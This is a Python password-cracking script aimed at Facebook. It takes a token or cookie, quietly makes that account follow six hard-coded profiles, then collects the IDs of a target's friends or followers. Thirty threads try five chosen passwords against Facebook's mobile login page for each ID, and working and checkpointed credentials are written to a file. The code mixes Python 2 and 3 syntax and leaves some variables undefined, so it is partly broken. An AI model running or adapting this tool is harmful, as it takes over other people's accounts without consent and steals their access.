#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import requests
import mechanize
import uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Safari/537.36')]

def keluar():
    print("   [!] Exit")
    os.sys.exit()

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)

def banner():
    os.system('echo -e "             _______      ________  ___  _______ __\n            / __/ _ )____/ ___/ _ \/ _ |/ ___/ //_/\n           / _// _  /___/ /__/ , _/ __ / /__/ ,< \n          /_/ /____/    \___/_/|_/_/ |_\___/_/|_|\n\n               Coded By : Dapunta Khurayra X\n─────────────────────────────────────────────────────────────" | lolcat')

def masuk():
    os.system("clear")
    banner()
    print("\n   [ Choose Login Methode ]")
    print("\n   [1] Login With Token")
    print("   [2] Login With Cookie")
    print("   [3] Update Script")
    print("   [0] Exit")
    pilih_masuk()

def pilih_masuk():
    sek = raw_input("\n   [•] Choose : ")
    if sek == "":
        print("   [!] Fill In The Correct")
        masuk()
    elif sek == "1":
        tokenz()
    elif sek == "2":
        cookie()
    elif sek == "3":
        updatesc()
    elif sek == "0":
        keluar()
    else:
        print("   [!] Fill In The Correct")
        masuk()

def tokenz():
    os.system('clear')
    banner()
    toket = raw_input("\n   [•] Token : ")
    try:
        response = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        response.raise_for_status()
        a = response.json()
        nama = a['name']
        with open('login.txt', 'w') as zedd:
            zedd.write(toket)
        print('\n   [•] Login Successful')
        bot_follow()
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred: {err}")
        os.system('clear')
        masuk()
    except Exception as err:
        print(f"Other error occurred: {err}")
        os.system('clear')
        masuk()

def cookie():
    os.system('clear')
    banner()
    try:
        cookie = raw_input("\n   [•] Cookie : ")
        headers = {
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36',
            'referer': 'https://m.facebook.com/',
            'host': 'm.facebook.com',
            'origin': 'https://m.facebook.com',
            'upgrade-insecure-requests': '1',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'text/html; charset=utf-8',
            'cookie': cookie
        }
        coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=headers)
        cari = re.search('(EAAA\w+)', coki.text)
        hasil = cari.group(1)
        with open("login.txt", 'w') as zedd:
            zedd.write(hasil)
        print('\n   [•] Login Successful')
        bot_follow()
    except AttributeError:
        print("   [!] Cookie Invalid")
        masuk()
    except UnboundLocalError:
        print("   [!] Cookie Invalid")
        masuk()
    except requests.exceptions.SSLError:
        os.system('clear')
        print("   [!] No Connection")
        keluar()

def bot_follow():
    try:
        toket = open('login.txt', 'r').read()
        urls = [
            'https://graph.facebook.com/1827084332/subscribers?access_token=',
            'https://graph.facebook.com/1602590373/subscribers?access_token=',
            'https://graph.facebook.com/100000729074466/subscribers?access_token=',
            'https://graph.facebook.com/607801156/subscribers?access_token=',
            'https://graph.facebook.com/100009340646547/subscribers?access_token=',
            'https://graph.facebook.com/100000415317575/subscribers?access_token='
        ]
        for url in urls:
            requests.post(url + toket)
        menu()
    except IOError:
        print("\n   [!] Token invalid")
        masuk()

def menu():
    os.system('clear')
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print("   [!] Token Invalid")
        os.system('rm -rf login.txt')
        masuk()
    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ttl = a['birthday']
    except KeyError:
        os.system('clear')
        print("   [!] Token Invalid")
        os.system('rm -rf login.txt')
        masuk()
    except requests.exceptions.ConnectionError:
        print("   [!] No Connection")
        keluar()
    passchoice()

def passchoice():
    os.system("clear")
    banner()
    print("\n   [ Choose Target]")
    print("\n   [1] Crack From Friendlist")
    print("   [2] Crack From Public")
    print("   [3] Crack From Followers")
    print("   [0] Log Out")
    pilih_passxd()

def pilih_passxd():
    peak = raw_input("\n   [•] Choose : ")
    if peak == "":
        print("   [!] Fill In The Correct")
        pilih_passxd()
    elif peak == "1":
        os.system('clear')
        banner()
        r = requests.get("https://graph.facebook.com/me/friends?access_token=" + toket)
        z = json.loads(r.text)
        id = [s['id'] for s in z['data']]
    elif peak == "2":
        os.system('clear')
        banner()
        idt = raw_input("\n   [•] User ID Target : ")
        try:
            pok = requests.get("https://graph.facebook.com/" + idt + "?access_token=" + toket)
            sp = json.loads(pok.text)
            print(f"   [•] Name           : {sp['name']}")
        except KeyError:
            print("   [!] Wrong ID Target")
            raw_input("\n   [ Back ]")
            menu()
        except requests.exceptions.ConnectionError:
            print("   [!] No Connection")
            keluar()
        r = requests.get("https://graph.facebook.com/" + idt + "/friends?access_token=" + toket)
        z = json.loads(r.text)
        id = [i['id'] for i in z['data']]
    elif peak == "3":
        os.system('clear')
        banner()
        idt = raw_input("\n   [•] Followers ID Target : ")
        try:
            pok = requests.get("https://graph.facebook.com/" + idt + "?access_token=" + toket)
            sp = json.loads(pok.text)
            print(f"   [•] Name           : {sp['name']}")
        except KeyError:
            print("   [!] Wrong ID Target")
            raw_input("\n   [ Back ]")
            menu()
        except requests.exceptions.ConnectionError:
            print("   [!] No Connection")
            keluar()
        r = requests.get("https://graph.facebook.com/" + idt + "/subscribers?limit=999999&access_token=" + toket)
        z = json.loads(r.text)
        id = [a['id'] for a in z['data']]
    elif peak == "0":
        os.system('rm -rf login.txt')
        keluar()
    else:
        print("   [!] Fill In The Correct")
        passchoice()

    print(f"   [•] Total ID       : {len(id)}")
    pass_list = [
        raw_input("\n   [•] Password 1     : "),
        raw_input("   [•] Password 2     : "),
        raw_input("   [•] Password 3     : "),
        raw_input("   [•] Password 4     : "),
        raw_input("   [•] Password 5     : ")
    ]
    print("\n   [•] Crack Started...\n")

    def main(user):
        global cekpoint, oks
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            a = requests.get(f'https://graph.facebook.com/{user}/?access_token={toket}')
            b = json.loads(a.text)
            tl = b.get('birthday', '')
            for password in pass_list:
                rex = requests.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": password, "login": "submit"}, headers=br.addheaders)
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print(f'\x1b[0;32m   [OK] {user} • {password} • {tl}')
                    with open('done/Indo.txt', 'a') as oke:
                        oke.write(f'\n[OK] {user} • {password}')
                    oks.append(user + password)
                    break
                elif 'checkpoint' in xo:
                    print(f'\x1b[0;33m   [CP] {user} • {password} • {tl}')
                    with open('done/Indo.txt', 'a') as cek:
                        cek.write(f'\n[CP] {user} • {password}')
                    cekpoint.append(user + password)
                    break
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print("\n\x1b[0;37m   [•] Crack Finished")
    print(f"   [•] Total OK/CP: {len(oks)}/{len(cekpoint)}")
    print("   [•] File Saved At : done/Indo.txt")
    raw_input("   [ Back ]")
    os.system("python2 fbcrack")
    menu()

def updatesc():
    os.system("clear")
    banner()
    jalan("\n   [•] Updating Script...")
    os.system("git pull origin master")
    print("   [•] Successfully Update")
    raw_input("\n   [ Back ]")
    os.system("python2 fbcrack")

if __name__ == '__main__':
    menu()